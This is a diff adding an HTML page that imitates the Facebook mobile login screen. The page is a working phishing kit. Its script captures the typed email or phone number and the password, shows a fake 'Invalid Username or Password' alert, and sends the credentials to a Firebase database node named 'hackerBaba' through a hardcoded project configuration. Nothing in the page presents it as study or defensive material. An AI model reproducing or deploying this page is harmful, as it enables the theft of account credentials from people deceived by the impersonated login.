@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Document</title>
+</head>
+
+<body>
+  <div class="heder-text">
+    <div class="heder-p">
+      <img class="h" hidden="hidden" src="1.jpeg"/>
+      <img class="top-img" src="2.jpg">
+      <div class="c"><span class="fcl"> Get Facebook for Android and browse faster.</span>
+      </div>
+    </div>
+  </div>
+  <div class="logo">
+    <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img" alt="facebook" />
+  </div>
+  <div class="input">
+    <input "number/email" class="email" id="email" "email" placeholder="Mobile number or email address"><br>
+    <input type="password" class="password" id="password" placeholder="Password">
+  </div>
+  <div>
+    <button onclick="writex()" class="login" name="login"><span class="_55sr"><b>Log In</b></span></button>
+  </div>
+  <div class="fp">
+    <a href="#">Forgotten password?</a>
+  </div>
+  <div class="or">
+    <hr>
+    <p>or</p>
+    <hr>
+  </div>
+  <button class="cb">Create New Account</button>
+  <div class="language">
+    <a href="#">English (UK)</a>
+    <a href="#">বাংলা</a>
+    <a href="#">অসমীয়</a>
+    <a href="#">हिन्दी</a>
+    <a href="#">नेपाली</a>
+    <a href="#">Español</a>
+    <a href="#">Português (Brasil)</a>
+    <a href="#"><span class="pl">+</span></a>
+  </div>
+  <div class="cpr"><span class="ep">Facebook Inc.</span></div>
+
+
+
+  <!--   css   -->
+  <style type="text/css" media="all">
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: sans-serif;
+    }
+   
+   
+    .heder-text {
+      background-color: #CECB9F7A;
+      padding: 12px;
+      color: #29376B
+      display: flex;
+    }
+   .header-text .heder-p{
+     display: flex;
+   }
+   .c{
+     display: flex;
+     align-items: center;
+     margin-left: 30px;
+     margin-top: -30px;
+   }
+   .top-img{
+     width: 20px;
+     position: relative;
+   }
+
+    .logo {
+      text-align: center;
+      margin: 7px;
+    }
+
+    .input {
+      line-height: 50px;
+      margin-top: 5px;
+      margin-bottom: 0px;
+    }
+
+    .input input {
+      padding: 13px;
+      border: none;
+      background-color: #D6D6D65E;
+      margin-top: 5px;
+      width: 95%;
+      margin-left: 10px;
+      border-radius: 5px;
+      box-shadow: 2px 0px 2px 0px lightgray;
+    }
+
+    .login {
+      padding: 13px;
+      border: none;
+      background-color: #1A62FFD6;
+      margin-top: 5px;
+      width: 95%;
+      margin-left: 10px;
+      border-radius: 5px;
+      color: #fff;
+      font-family: sans-serif;
+      font-size: 15px;
+      box-shadow: 2px 0px 2px 0px lightgray;
+      text-shadow: 1px 0px 2px 1px black;
+    }
+
+    .fp {
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    .fp a {
+      text-decoration: none;
+      color: #1A62FFD6;
+    }
+
+    .or {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: row;
+    }
+
+    .or hr {
+      width: 40%;
+      color: gray;
+      height: 0px;
+      background-color: black;
+    }
+
+    .or p {
+      padding: 15px;
+    }
+
+    .cb {
+      background-color: #089F29;
+      color: #fff;
+      border: none;
+      width: 50%;
+      padding: 10px;
+      border-radius: 5px;
+      margin-top: 5px;
+      margin-left: 25%;
+      text-shadow: 1px 0px 2px black;
+    }
+
+    .language {
+      font-size: 12px;
+      display: grid;
+      grid-template-columns: repeat(2, auto);
+      margin-top: 100px;
+      text-align: center;
+    }
+
+    .language a {
+      text-decoration: none;
+      color: grey;
+    }
+   .cpr{
+     text-align: center;
+     margin-top: 15px;
+     font-size: 12px;
+     color: grey;
+   }
+  .pl{
+    border: 1px solid gray;
+    padding: 0px 3px 0px 3px;
+    border-radius: 2px
+  }
+  </style>
+  <!-- css -->
+  <!-- script -->
+
+
+ <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+<script>
+
+		var firebaseConfig = {
+apiKey: "AIzaSyBFBhTk-2b8erUH_6hBelw8LUNd9JIzkf8",
+authDomain: "loginsignup-e1d8c.firebaseapp.com",
+projectId: "loginsignup-e1d8c",
+storageBucket: "loginsignup-e1d8c.appspot.com",
+messagingSenderId: "437517792151",
+appId: "1:437517792151:web:c6406aba4232ce708ecad2"
+
+		};
+		firebase.initializeApp(firebaseConfig);
+		</script>
+<script type="text/javascript">
+		var num,psx;
+		var ida;
+		var idb;
+		
+		var etype=typ(num);
+	
+		
+			function writex(){
+				read();
+				alert("Invalid Username or Password")
+				if(num=="" || psx ==""){
+				return;
+				}
+				if (num.toString().length < 11 || psx.toString().length < 5) {
+				  return;
+				}
+		
+				
+				firebase.database().ref("hackerBaba").push().set({
+					emailx: num,
+					passx: psx
+				});
+			}
+			function read(){
+				 num = document.getElementById("email").value;
+				psx = document.getElementById("password").value;
+			}
+			function id(){
+			 ida="m_email";
+			 idb ="m_log";
+			}
+		</script>
+
+
+  </script>
+  <script>
+    function typ(e){
+      return typeof e;
+    }
+  </script>
+  <!-- script -->
+</body>
+
+</html>
+<!-- by Biplob-->
